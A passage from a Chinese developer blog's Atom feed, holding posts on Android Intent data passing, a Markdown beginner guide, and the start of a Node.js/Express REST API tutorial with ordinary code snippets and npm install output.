    <span class="tag">&lt;/<span class="title">ion-list</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="title">ion-content</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">ion-pane</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="一、环境搭建">一、环境搭建</h2><ol>
<li>在安装ionic框架之前，需要先安装nodejs环境，具体可参考本博客之前的文章；</li>
<li>使用命令行安装最新版本的Cordova和Ionic <code>npm install -g cordova ionic</code></li>
<li>安装成功后，可以看到如下打印：</li>
</ol>]]>
    
    </summary>
    
      <category term="app" scheme="http://science09.github.io/tags/app/"/>
    
      <category term="ionic" scheme="http://science09.github.io/tags/ionic/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android之Intent数据传递]]></title>
    <link href="http://science09.github.io/2014/09/14/Android%E4%B9%8BIntent%E6%95%B0%E6%8D%AE/"/>
    <id>http://science09.github.io/2014/09/14/Android之Intent数据/</id>
    <published>2014-09-14T05:26:16.000Z</published>
    <updated>2015-09-10T13:26:51.000Z</updated>
    <content type="html"><![CDATA[<p>Intent（意图）主要是解决Android应用的各项组件之间的通讯。Intent负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android则根据此Intent的描述，负责找到对应的组件，将 Intent传递给调用的组件，并完成组件的调用。因此，Intent在这里起着一个媒体中介的作用，专门提供组件互相调用的相关信息，实现调用者与被调用者之间的解耦。<br><a id="more"></a><br>例如，在一个联系人维护的应用中，当我们在一个联系人列表屏幕(假设对应的Activity为listActivity)上，点击某个联系人后，希望能够跳出此联系人的详细信息屏幕(假设对应的Activity为detailActivity)</p>
<p>为了实现这个目的，listActivity需要构造一个 Intent，这个Intent用于告诉系统，我们要做“查看”动作，此动作对应的查看对象是“某联系人”，然后调用startActivity (Intent intent)，将构造的Intent传入，系统会根据此Intent中的描述，到ManiFest中找到满足此Intent要求的Activity，系统会调用找到的 Activity，即为detailActivity，最终传入Intent，detailActivity则会根据此Intent中的描述，执行相应的操作。</p>
<h2 id="Intent的使用">Intent的使用</h2><h4 id="1-_Activity的简单跳转">1. Activity的简单跳转</h4><p>Activity的切换一般是通过Intent来实现的，Intent是一个Activity到达另一个Activity的引路者，它描述了起点（当前Activity）和终点（目标Activity）。一个简单Intent实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();                           <span class="comment">//创建一个Intent对象</span></span><br><span class="line">intent.setClass(activityA.<span class="keyword">this</span>, activityB.class);    <span class="comment">//描述起点和目标</span></span><br><span class="line">startActivity(intent);                                       <span class="comment">//开始跳转</span></span><br></pre></td></tr></table></figure></p>
<h4 id="2-包含数据传递的跳转">2.包含数据传递的跳转</h4><p>通常，我们在Activity的切换中，希望把前一个Activity的某些数据传递给下一个Activity。这时，我们可以借助Bundle来实现。Bundle，相当于数据存储包，用于存放我们想要转达的数据。打个比方，Intent就像一封邮件，里面有送信人地址（原始Activity），也有收信人地址（目标Activity），而Bundle就是附件也可看做是信件内容。下面是它的简单实现：</p>
<p> A、ActivityA发送：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setClass(activityA.<span class="keyword">this</span>, activityB.class);   <span class="comment">//描述起点和目标</span></span><br><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();                           <span class="comment">//创建Bundle对象</span></span><br><span class="line">bundle.putString(<span class="string">"data"</span>, <span class="string">"ActivityA发来的数据"</span>);     <span class="comment">//装入数据</span></span><br><span class="line">intent.putExtras(bundle);                                <span class="comment">//把Bundle塞入Intent里面</span></span><br><span class="line">startActivity(intent);                                     <span class="comment">//开始切换</span></span><br></pre></td></tr></table></figure>
<p>B、ActivityB接受从ActivityA发来的数据：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">this</span>.getIntent();        <span class="comment">//获取已有的intent对象</span></span><br><span class="line">Bundle bundle = intent.getExtras();    <span class="comment">//获取intent里面的bundle对象</span></span><br><span class="line">string = bundle.getString(<span class="string">"data"</span>);    <span class="comment">//获取Bundle里面的字符串</span></span><br></pre></td></tr></table></figure>
<h4 id="3-_接受目标Activity返回的结果">3. 接受目标Activity返回的结果</h4><p>解决了如何传递数据问题，那么下一个问题是如何接受从目标Activity返回的处理结果。这里有两种方式，一是在onRestart方法（onRestrart表示重启Activity时激发的事件，具体看上一篇的生命周期）里面接受处理结果，方法实现和ActivityB接受从ActivityA发来的数据处理一样。另一种方式，是采用应答模式切换。这里，主要下第二种方式。应答模式切换和普通的切换不同在于，普通的是有去没回，应答则是有来有往。代码实现也不一样：</p>
<p>1、从ActivityA切换到ActivityB：startActivityForResult(intent,0);<br>2、从ActivityB返回到ActivityA：setResult(RESULT_OK, intent)；<br>3、接受返回结果：protected void onActivityResult()。<br>具体代码如下;</p>
<p>A、从ActivityA切换到ActivityB：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();    </span><br><span class="line">intent = intent.setClass(ActivityIntent.<span class="keyword">this</span>, AnotherActivity.class);</span><br><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();    </span><br><span class="line">bundle.putString(<span class="string">"string"</span>, et_string.getText().toString());</span><br><span class="line">intent.putExtras(bundle);</span><br><span class="line">startActivityForResult(intent,<span class="number">0</span>);       <span class="comment">//只有这里不同 </span></span><br><span class="line"> <span class="comment">//ActivityIntent.this.finish();  //不能用finish，会触发onDestroy();</span></span><br></pre></td></tr></table></figure>
<p>B、从ActivityB返回到ActivityA：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent = intent.setClass(AnotherActivity.<span class="keyword">this</span>, ActivityIntent.class);</span><br><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">bundle.putInt(<span class="string">"result"</span>, <span class="string">"ActivityB的处理结果"</span>);</span><br><span class="line">intent.putExtras(bundle);</span><br><span class="line">AnotherActivity.<span class="keyword">this</span>.setResult(RESULT_OK, intent);   <span class="comment">//RESULT_OK是返回状态码</span></span><br><span class="line">AnotherActivity.<span class="keyword">this</span>.finish(); <span class="comment">//会触发onDestroy();</span></span><br></pre></td></tr></table></figure>
<p>C、ActivityA接受ActivityB的返回结果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    <span class="keyword">switch</span>(resultCode) &#123; <span class="comment">//根据状态码，处理返回结果</span></span><br><span class="line">        <span class="keyword">case</span> RESULT_OK:</span><br><span class="line">        Bundle bundle =data.getExtras();   <span class="comment">//获取intent里面的bundle对象</span></span><br><span class="line">        String result = bundle.getInt(<span class="string">"result"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-_Activity状态保留">4. Activity状态保留</h4><p>从ActivityB中返回到ActivityA（在ActivityA切换到ActivityB时，调用了finish方法），你会发现你在ActivityA以前的数据全没了，简单的说就是数据被没有保留下来。因为finish方法，会触发onDestroy()，使得ActivityA销毁。下一次再来到ActivityA时，是全新的ActivityA，以往的数据当然不在。如果想保留切换前的状态，可以采用两种方式：</p>
<p>1、切换时，不调用finish()方法。<br>2、采用SharedPreferences来保存数据。SharedPreferences 是一个轻量级存储类，主要用于保存一些窗体的状态，如文本框值、按钮状态等等，类似于Session。一般在onPause()方法里面保存数据，在onResume()里面提取数据。实现如下：</p>
<p>A、保存数据</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//暂停：onStart()-&gt;onResume()-&gt;onPause()</span></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        Log.e(<span class="string">"Lifecycle_Activity1"</span>, <span class="string">"onPause()"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把数据保存到类似于Session之类的存储集合里面</span></span><br><span class="line">        SharedPreferences.Editor saveData = getPreferences(<span class="number">0</span>).edit();</span><br><span class="line">        saveData.putString(<span class="string">"value"</span>, et_string.getText().toString());</span><br><span class="line">        saveData.commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>B、提取数据</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重启：onStart()-&gt;onResume()</span></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        Log.e(<span class="string">"Lifecycle_Activity1"</span>, <span class="string">"onResume()"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从共享数据存储对象中获取所需的数据 </span></span><br><span class="line">        SharedPreferences getData = getPreferences(<span class="number">0</span>);</span><br><span class="line">        String value = getData.getString(<span class="string">"value"</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span>(value != <span class="keyword">null</span>) &#123;</span><br><span class="line">            et_string.setText(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>Intent（意图）主要是解决Android应用的各项组件之间的通讯。Intent负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android则根据此Intent的描述，负责找到对应的组件，将 Intent传递给调用的组件，并完成组件的调用。因此，Intent在这里起着一个媒体中介的作用，专门提供组件互相调用的相关信息，实现调用者与被调用者之间的解耦。<br>]]>
    
    </summary>
    
      <category term="Android" scheme="http://science09.github.io/tags/Android/"/>
    
      <category term="Intent" scheme="http://science09.github.io/tags/Intent/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Markdown——入门指南]]></title>
    <link href="http://science09.github.io/2014/09/10/Markdown%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://science09.github.io/2014/09/10/Markdown入门指南/</id>
    <published>2014-09-10T12:33:36.000Z</published>
    <updated>2015-09-10T13:46:28.000Z</updated>
    <content type="html"><![CDATA[<h2 id="导语：">导语：</h2><blockquote>
<p>Markdown 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。看到这里请不要被「标记」、「语言」所迷惑，Markdown 的语法十分简单。常用的标记符号也不超过十个，这种相对于更为复杂的HTML 标记语言来说，Markdown 可谓是十分轻量的，学习成本也不需要太多，且一旦熟悉这种语法规则，会有一劳永逸的效果。<br><a id="more"></a></p>
</blockquote>
<p><img src="http://ww3.sinaimg.cn/large/6aee7dbbgw1effia3l1xoj214z0n8dkl.jpg" alt=""></p>
<h2 id="一、_认识Markdown">一、 认识Markdown</h2><p>在刚才的导语里提到，Markdown 是一种用来写作的轻量级「标记语言」，它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。它使我们专心于码字，用「标记」语法，来代替常见的排版格式。例如此文从内容到格式，甚至插图，键盘就可以通通搞定了。目前来看，支持Markdown 语法的编辑器有很多，包括很多网站（例如简书）也支持了Markdown 的文字录入。Markdown 从写作到完成，导出格式随心所欲，你可以导出HTML格式的文件用来网站发布，也可以十分方便的导出PDF格式，这种格式写出的简历更能得到HR的好感。甚至可以利用<a href="http://www.getcloudapp.com/" target="_blank" rel="external">CloudApp</a>这种云服务工具直接上传至网页用来分享你的文章，全球最大的轻博客平台<a href="http://te1ee.tumblr.com/" target="_blank" rel="external">Tumblr</a>，也支持Mou这类Markdown 工具的直接上传。</p>
<h2 id="Markdown官方文档">Markdown官方文档</h2><ul>
<li><a href="http://daringfireball.net/projects/markdown/syntax" target="_blank" rel="external">创始人John Gruber的Markdown语法说明</a></li>
<li><a href="http://wowubuntu.com/markdown/#list" target="_blank" rel="external">Markdown中文版语法说明</a></li>
</ul>
<h2 id="使用Markdown的优点">使用Markdown的优点</h2><ul>
<li>专注你的文字内容而不是排版样式。</li>
<li>轻松的导出HTML、PDF和本身的.md文件。</li>
<li>纯文本内容，兼容所有的文本编辑器与字处理软件。</li>
<li>可读，直观。适合所有人的写作语言。</li>
</ul>
<h2 id="Markdown编辑器">Markdown编辑器</h2><ul>
<li>在Mac OS X上，我强烈建议你用Mou这款免费且十分好用的Markdown编辑器，它支持实时预览，既左边是你编辑Markdown语言，右边会实时的生成预览效果，笔者文章就是Mou这款软件写出来的。</li>
</ul>
<p><img src="http://ww1.sinaimg.cn/large/6aee7dbbgw1effcq2gx92j210j0ustj7.jpg" alt=""></p>
<p>其次还有很多，如果你是个编辑作者，我强烈建议你购买 Ulysses Ⅲ，这款软件入围了苹果去年Mac App Store的The Best of 2013。它支持更多的写作格式、多文档的支持。Mou，iA writer这些软件都是基于单文档的管理方式，而Ulysses Ⅲ支持Folder、Filter的管理，一个Folder里面可以创建多个Sheet，Sheet之间也可以进行Combine处理。</p>
<p><img src="http://ww3.sinaimg.cn/large/6aee7dbbgw1effd31zsw9j20o604iaae.jpg" alt=""></p>
<ul>
<li>由于笔者不用Windows，Windows下的Markdown工具没有用过，经朋友介绍，有两款还算不错，一款叫<a href="http://www.markdownpad.com/" target="_blank" rel="external">MarkdownPad</a> ，另一款叫<a href="http://code52.org/DownmarkerWPF/" target="_blank" rel="external">MarkPad</a></li>
</ul>
<ul>
<li>iOS端很多app早已经支持了Markdown录入，例如Drafts，Day One，iA writer等。</li>
</ul>
<ul>
<li>在Web端，我强烈推荐<a href="http://jianshu.io/" target="_blank" rel="external">简书</a>这款产品，上面有无数热爱文字的人在不停的创造，分享。在Web端使用Markdown没有比简书更舒服的地方了，同样支持左右两栏的实时预览，字体优雅，简洁。</li>
</ul>
<p><img src="http://ww2.sinaimg.cn/large/6aee7dbbgw1effdkfijo1j21220nigth.jpg" alt=""></p>
<ul>
<li>同样是Web端，<a href="https://draftin.com/" target="_blank" rel="external">Draftin</a> 也近乎完美。</li>
</ul>
<h2 id="二、Markdown语法的简要规则">二、Markdown语法的简要规则</h2><p><strong>标题</strong><br><img src="http://ww1.sinaimg.cn/large/6aee7dbbgw1effeaclhiyj20eh09cwez.jpg" alt=""></p>
<p>标题是每篇文章都需要也是最常用的格式，在Markdown 中，如果一段文字被定义为标题，只要在这段文字前加 <code>#</code> 号即可。</p>
<p><code># 一级标题</code></p>
<p><code>## 二级标题</code></p>
<p><code>### 三级标题</code></p>
<p>以此类推，总共六级标题，建议在井号后加一个空格，这是最标准的Markdown语法。</p>
<p><strong>列表</strong></p>
<p>熟悉HTML的同学肯定知道有序列表与无序列表的区别，在Markdown 下，列表的显示只需要在文字前加上 <code>-</code> 或 <code>*</code> 即可变为无序列表，有序列表则直接在文字前加<code>1.</code> <code>2.</code> <code>3.</code> 符号要和文字之间加上一个字符的空格。</p>
<p><img src="http://ww4.sinaimg.cn/large/6aee7dbbgw1effew5aftij20d80bz3yw.jpg" alt=""></p>
<p><strong>引用</strong></p>
<p>如果你需要引用一小段别处的句子，那么就要用引用的格式。</p>
<p>&gt;</p>
<blockquote>
<p>例如这样</p>
</blockquote>
<p>只需要在文本前加入 <code>&gt;</code> 这种尖括号（大于号）即可</p>
<p><img src="http://ww3.sinaimg.cn/large/6aee7dbbgw1effezhonxlj20e009c3yu.jpg" alt=""></p>
<p><strong>图片与链接</strong></p>
<p>插入链接与插入图片的语法很像，区别在一个 !号</p>
<p>图片为：<code>![]()</code></p>
<p>链接为：<code>[]()</code></p>
<p>插入图片的地址需要图床，这里推荐<a href="http://www.getcloudapp.com/" target="_blank" rel="external">CloudApp</a>的服务，生成URL地址即可。</p>
<p><img src="http://ww2.sinaimg.cn/large/6aee7dbbgw1efffa67voyj20ix0ctq3n.jpg" alt=""></p>
<p><strong>粗体与斜体</strong></p>
<p>Markdown 的粗体和斜体也非常简单，用两个 <code>*</code> 包含一段文本就是粗体的语法，用一个 <code>*</code> 包含一段文本就是斜体的语法。</p>
<p>例如：这里是粗体 <em>这里是斜体</em></p>
<p><strong>表格</strong></p>
<p>表格是我觉得Markdown比较累人的地方，例子如下：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| Tables        | Are           | Cool  |</span><br><span class="line">| ------------- |:-------------:| :-----|</span><br><span class="line">| col 3 is      | right-aligned | $1600 |</span><br><span class="line">| col 2 is      | centered      |   $12 |</span><br><span class="line">| zebra stripes | are neat      |    $1 |</span><br></pre></td></tr></table></figure>
<p>这种语法生成的表格如下：</p>
<table>
<thead>
<tr>
<th>Tables</th>
<th style="text-align:center">Are</th>
<th style="text-align:left">Cool</th>
</tr>
</thead>
<tbody>
<tr>
<td>col 3 is</td>
<td style="text-align:center">right-aligned</td>
<td style="text-align:left">$1600</td>
</tr>
<tr>
<td>col 2 is</td>
<td style="text-align:center">centered</td>
<td style="text-align:left">$12</td>
</tr>
<tr>
<td>zebra stripes</td>
<td style="text-align:center">are neat</td>
<td style="text-align:left">$1</td>
</tr>
</tbody>
</table>
<p><strong>代码框</strong></p>
<p>如果你是个程序猿，需要在文章里优雅的引用代码框，在Markdown下实现也非常简单，只需要用两个 ` 把中间的代码包裹起来。图例：</p>
<p>如果你是个程序猿，需要在文章里优雅的引用代码框，在Markdown下实现也非常简单，只需要用两个 ` 把中间的代码包裹起来。图例：</p>
<p><img src="http://ww3.sinaimg.cn/large/6aee7dbbgw1effg1lsa97j20lt0a8dgs.jpg" alt=""></p>
<p>使用 <code>tab</code> 键即可缩进。</p>
<p><strong>分割线</strong></p>
<p>分割线的语法只需要三个 <code>*</code> 号，例如：</p>
<blockquote>
<p>到这里，Markdown 的基本语法在日常的使用中基本就没什么大问题了，只要多加练习，配合好用的工具，写起东西来肯定会行云流水。更多的语法规则，其实Mou的Help文档栗子很好，当你第一次使用Mou时，就会显示该文档。可以用来对用的查找和学习。</p>
</blockquote>
<p><img src="http://ww3.sinaimg.cn/large/6aee7dbbgw1effgmnpgqlj210j0us44j.jpg" alt=""></p>
<h2 id="三，相关推荐:">三，相关推荐:</h2><p><strong>工具</strong></p>
<p>图床工具用来上传图片获取URL地址</p>
<ul>
<li><a href="http://droplr.com/" target="_blank" rel="external">Droplr</a></li>
<li><a href="http://www.getcloudapp.com/" target="_blank" rel="external">Cloudapp</a></li>
<li><a href="https://itunes.apple.com/cn/app/yi-xiang/id672522335?mt=12&amp;uo=4" target="_blank" rel="external">ezShare for Mac</a></li>
<li><a href="http://weibotuchuang.sinaapp.com/" target="_blank" rel="external">围脖图床修复计划</a></li>
</ul>
<p>在线好用的Markdown工具，为印象笔记而生</p>
<ul>
<li><a href="http://maxiang.info/" target="_blank" rel="external">马克飞象，专为印象笔记打造的Markdown编辑器，非常推荐</a></li>
</ul>
<p>原文链接: <a href="http://jianshu.io/p/1e402922ee32" target="_blank" rel="external">http://jianshu.io/p/1e402922ee32</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="导语：">导语：</h2><blockquote>
<p>Markdown 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。看到这里请不要被「标记」、「语言」所迷惑，Markdown 的语法十分简单。常用的标记符号也不超过十个，这种相对于更为复杂的HTML 标记语言来说，Markdown 可谓是十分轻量的，学习成本也不需要太多，且一旦熟悉这种语法规则，会有一劳永逸的效果。<br>]]>
    
    </summary>
    
      <category term="Markdown" scheme="http://science09.github.io/tags/Markdown/"/>
    
      <category term="WEB" scheme="http://science09.github.io/categories/WEB/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用Node.js，Express，MongoDB创建REST API]]></title>
    <link href="http://science09.github.io/2014/09/03/%E4%BD%BF%E7%94%A8Node-js%EF%BC%8CExpress%EF%BC%8CMongoDB%E5%88%9B%E5%BB%BAREST-API/"/>
    <id>http://science09.github.io/2014/09/03/使用Node-js，Express，MongoDB创建REST-API/</id>
    <published>2014-09-03T13:34:37.000Z</published>
    <updated>2015-09-10T14:05:51.000Z</updated>
    <content type="html"><![CDATA[<p><img src="C:\Users\le\Downloads\nodemango1.jpg" alt="nodeMongo"><br><a id="more"></a><br>本文介绍如何使用Node.js，Express，MongoDB快速的创建REST ful API。</p>
<h4 id="安装Node-js">安装Node.js</h4><p>到Node的官方网站<a href="http://nodejs.org" target="_blank" rel="external">http://nodejs.org</a>下载并安装；Windows上Node的安装可参考这篇文章: <a href="http://www.byte.tk/under-windows-platform-development-environment-to-build-node-js/" target="_blank" rel="external">Windows平台下Node.js开发环境搭建</a></p>
<p>Nodejs安装完毕后，接下来创建一个WEB服务器。我们将使用Nodejs作为我们项目的一个出发点：通过REST ful API访问数据（retrieve, create, update, delete）wine数据库。</p>
<ol>
<li>创建一个 winecell的文件夹；</li>
<li>在winecell文件夹内创建一个server.js的文件；</li>
<li>在server.js文件敲入以下代码；<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line">	res.end(<span class="string">'Hello World\n'</span>);</span><br><span class="line">&#125;).listen(<span class="number">3000</span>, <span class="string">'127.0.0.1'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:3000/'</span>);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>我们现在准备启动服务器并测试该应用程序，</p>
<ol>
<li>打开一个shell，切换到winecell的目录下，执行 node server.js 启动服务器；</li>
<li>测试该Http服务器是否正常，打开浏览器访问 <a href="http://localhost:3000" target="_blank" rel="external">http://localhost:3000</a> 。</li>
</ol>
<h4 id="安装Express">安装Express</h4><p>Express是一个轻型的node.js web应用程序框架。他提供了基本的Http操作，可以很容易的创建REST接口。</p>
<p>在winecell应用程序中安装Express</p>
<ol>
<li><p>在winecell文件夹中，创建一个package.json的文件，文件内容如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">"name"</span>: <span class="string">"wine-cellar"</span>,</span><br><span class="line">	<span class="string">"description"</span>: <span class="string">"Wine Cellar Application"</span>,</span><br><span class="line">	<span class="string">"version"</span>: <span class="string">"0.0.1"</span>,</span><br><span class="line">	<span class="string">"private"</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="string">"dependencies"</span>: &#123;</span><br><span class="line">	<span class="string">"express"</span>: <span class="string">"3.x"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>目录切换到 winecell中，执行以下命令来安装express模块。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install express</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>安装过程打印信息：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">D:\Project\JavaScript\winecell&gt;npm install express</span><br><span class="line">express@<span class="number">3.16</span><span class="number">.5</span> node_modules\express</span><br><span class="line">├── basic-auth@<span class="number">1.0</span><span class="number">.0</span></span><br><span class="line">├── range-parser@<span class="number">1.0</span><span class="number">.0</span></span><br><span class="line">├── merge-descriptors@<span class="number">0.0</span><span class="number">.2</span></span><br><span class="line">├── cookie@<span class="number">0.1</span><span class="number">.2</span></span><br><span class="line">├── fresh@<span class="number">0.2</span><span class="number">.2</span></span><br><span class="line">├── media-typer@<span class="number">0.2</span><span class="number">.0</span></span><br><span class="line">├── <span class="built_in">escape</span>-html@<span class="number">1.0</span><span class="number">.1</span></span><br><span class="line">├── cookie-signature@<span class="number">1.0</span><span class="number">.4</span></span><br><span class="line">├── vary@<span class="number">0.1</span><span class="number">.0</span></span><br><span class="line">├── parseurl@<span class="number">1.3</span><span class="number">.0</span></span><br><span class="line">├── methods@<span class="number">1.1</span><span class="number">.0</span></span><br><span class="line">├── buffer-crc32@<span class="number">0.2</span><span class="number">.3</span></span><br><span class="line">├── depd@<span class="number">0.4</span><span class="number">.4</span></span><br><span class="line">├── debug@<span class="number">1.0</span><span class="number">.4</span> (ms@<span class="number">0.6</span><span class="number">.2</span>)</span><br><span class="line">├── commander@<span class="number">1.3</span><span class="number">.2</span> (keypress@<span class="number">0.1</span><span class="number">.0</span>)</span><br><span class="line">├── proxy-addr@<span class="number">1.0</span><span class="number">.1</span> (ipaddr.js@<span class="number">0.1</span><span class="number">.2</span>)</span><br><span class="line">├── mkdirp@<span class="number">0.5</span><span class="number">.0</span> (minimist@<span class="number">0.0</span><span class="number">.8</span>)</span><br><span class="line">├── send@<span class="number">0.8</span><span class="number">.1</span> (ms@<span class="number">0.6</span><span class="number">.2</span>, mime@<span class="number">1.2</span><span class="number">.11</span>, finished@<span class="number">1.2</span><span class="number">.2</span>)</span><br><span class="line">└── connect@<span class="number">2.25</span><span class="number">.5</span> (finalhandler@<span class="number">0.1</span><span class="number">.0</span>, bytes@<span class="number">1.0</span><span class="number">.0</span>, pause@<span class="number">0.0</span><span class="number">.1</span>, response-ti</span><br><span class="line">me@<span class="number">2.0</span><span class="number">.1</span>, serve-favicon@<span class="number">2.0</span><span class="number">.1</span>, on-headers@<span class="number">1.0</span><span class="number">.0</span>, basic-auth-connect@<span class="number">1.0</span><span class="number">.0</span>, vhost</span><br><span class="line">@<span class="number">2.0</span><span class="number">.0</span>, cookie-parser@<span class="number">1.3</span><span class="number">.2</span>, connect-timeout@<span class="number">1.2</span><span class="number">.2</span>, qs@<span class="number">1.2</span><span class="number">.1</span>, morgan@<span class="number">1.2</span><span class="number">.2</span>, serv</span><br><span class="line">e-static@<span class="number">1.5</span><span class="number">.1</span>, type-is@<span class="number">1.3</span><span class="number">.2</span>, method-override@<span class="number">2.1</span><span class="number">.3</span>, errorhandler@<span class="number">1.1</span><span class="number">.1</span>, compre</span><br><span class="line">ssion@<span class="number">1.0</span><span class="number">.11</span>, body-parser@<span class="number">1.6</span><span class="number">.3</span>, serve-index@<span class="number">1.1</span><span class="number">.6</span>, 